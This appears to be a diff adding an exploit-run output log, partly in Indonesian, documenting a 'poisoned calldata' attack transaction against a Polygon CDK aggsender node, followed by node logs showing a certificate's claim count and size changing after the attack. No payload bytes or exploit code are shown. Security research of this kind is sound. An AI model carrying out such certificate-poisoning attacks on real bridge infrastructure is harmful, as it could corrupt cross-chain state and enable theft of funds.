@@ -1,0 +1,32 @@
+═══ [1] LADDER_BLOB — 32 elemen PERTAMA (slice [0:32]) ═══════
+blob len: 2048 hex = 1024 byte (harus 1024)
+
+═══ [2] ATTACK TX — FINAL ═══════
+attack tx: 0x065b10cd7e01acd5617807f1e8628eb6c134310f02f78609132a36c6305bd7b6
+receipt: {"status":"0x1","gasUsed":"0x253b0","logs":1,"topics":["0x1df3f2a973a00d6635911755c260704e95e8a5876997546798770f76396fda4d"]}
+selector count: 4
+
+══════════════════════════════════════════════════════════════════════
+═══ EKSPLOIT LENGKAP: ClaimEvent SAH + CALldata RACUN dalam SATU TX ═══
+══════════════════════════════════════════════════════════════════════
+
+═══ [3] POISONING PIPELINE — observasi 90s ═══════
+--- log cdk-node SETELAH attack ---
+2026-08-22T19:38:24.696Z	[34mINFO[0m	aggsender/aggsender.go:234	building certificate for FromBlock: 1, ToBlock: 18263, numBridges: 3, numClaims: 0, createdAt: 1787427504 estimatedSize=690	{"pid": 7, "version": "v0.1.0", "module": "aggsender"}
+2026-08-22T19:38:30.702Z	[34mINFO[0m	aggsender/aggsender.go:234	building certificate for FromBlock: 1, ToBlock: 18269, numBridges: 3, numClaims: 0, createdAt: 1787427510 estimatedSize=690	{"pid": 7, "version": "v0.1.0", "module": "aggsender"}
+2026-08-22T19:38:36.707Z	[34mINFO[0m	aggsender/aggsender.go:234	building certificate for FromBlock: 1, ToBlock: 18275, numBridges: 3, numClaims: 0, createdAt: 1787427516 estimatedSize=690	{"pid": 7, "version": "v0.1.0", "module": "aggsender"}
+2026-08-22T19:38:42.713Z	[34mINFO[0m	aggsender/aggsender.go:234	building certificate for FromBlock: 1, ToBlock: 18281, numBridges: 3, numClaims: 0, createdAt: 1787427522 estimatedSize=690	{"pid": 7, "version": "v0.1.0", "module": "aggsender"}
+2026-08-22T19:38:48.718Z	[34mINFO[0m	aggsender/aggsender.go:234	building certificate for FromBlock: 1, ToBlock: 18287, numBridges: 3, numClaims: 0, createdAt: 1787427528 estimatedSize=690	{"pid": 7, "version": "v0.1.0", "module": "aggsender"}
+2026-08-22T19:38:54.722Z	[34mINFO[0m	aggsender/aggsender.go:234	building certificate for FromBlock: 1, ToBlock: 18293, numBridges: 3, numClaims: 0, createdAt: 1787427534 estimatedSize=690	{"pid": 7, "version": "v0.1.0", "module": "aggsender"}
+2026-08-22T19:39:00.727Z	[34mINFO[0m	aggsender/aggsender.go:234	building certificate for FromBlock: 1, ToBlock: 18299, numBridges: 3, numClaims: 0, createdAt: 1787427540 estimatedSize=690	{"pid": 7, "version": "v0.1.0", "module": "aggsender"}
+2026-08-22T19:39:06.733Z	[34mINFO[0m	aggsender/aggsender.go:234	building certificate for FromBlock: 1, ToBlock: 18305, numBridges: 3, numClaims: 0, createdAt: 1787427546 estimatedSize=690	{"pid": 7, "version": "v0.1.0", "module": "aggsender"}
+2026-08-22T19:39:12.740Z	[34mINFO[0m	aggsender/aggsender.go:234	building certificate for FromBlock: 1, ToBlock: 18311, numBridges: 3, numClaims: 0, createdAt: 1787427552 estimatedSize=690	{"pid": 7, "version": "v0.1.0", "module": "aggsender"}
+2026-08-22T19:39:18.745Z	[34mINFO[0m	aggsender/aggsender.go:234	building certificate for FromBlock: 1, ToBlock: 18317, numBridges: 3, numClaims: 0, createdAt: 1787427558 estimatedSize=690	{"pid": 7, "version": "v0.1.0", "module": "aggsender"}
+2026-08-22T19:39:24.752Z	[34mINFO[0m	aggsender/aggsender.go:234	building certificate for FromBlock: 1, ToBlock: 18323, numBridges: 3, numClaims: 0, createdAt: 1787427564 estimatedSize=690	{"pid": 7, "version": "v0.1.0", "module": "aggsender"}
+2026-08-22T19:39:30.757Z	[34mINFO[0m	aggsender/aggsender.go:234	building certificate for FromBlock: 1, ToBlock: 18329, numBridges: 3, numClaims: 0, createdAt: 1787427570 estimatedSize=690	{"pid": 7, "version": "v0.1.0", "module": "aggsender"}
+2026-08-22T19:39:36.764Z	[34mINFO[0m	aggsender/aggsender.go:234	building certificate for FromBlock: 1, ToBlock: 18335, numBridges: 3, numClaims: 0, createdAt: 1787427576 estimatedSize=690	{"pid": 7, "version": "v0.1.0", "module": "aggsender"}
+2026-08-22T19:39:42.769Z	[34mINFO[0m	aggsender/aggsender.go:234	building certificate for FromBlock: 1, ToBlock: 18341, numBridges: 3, numClaims: 0, createdAt: 1787427582 estimatedSize=690	{"pid": 7, "version": "v0.1.0", "module": "aggsender"}
+2026-08-22T19:39:48.782Z	[34mINFO[0m	aggsender/aggsender.go:234	building certificate for FromBlock: 1, ToBlock: 18347, numBridges: 3, numClaims: 1, createdAt: 1787427588 estimatedSize=8720	{"pid": 7, "version": "v0.1.0", "module": "aggsender"}
+
+--- node status ---
+cdk-node	Up About an hour
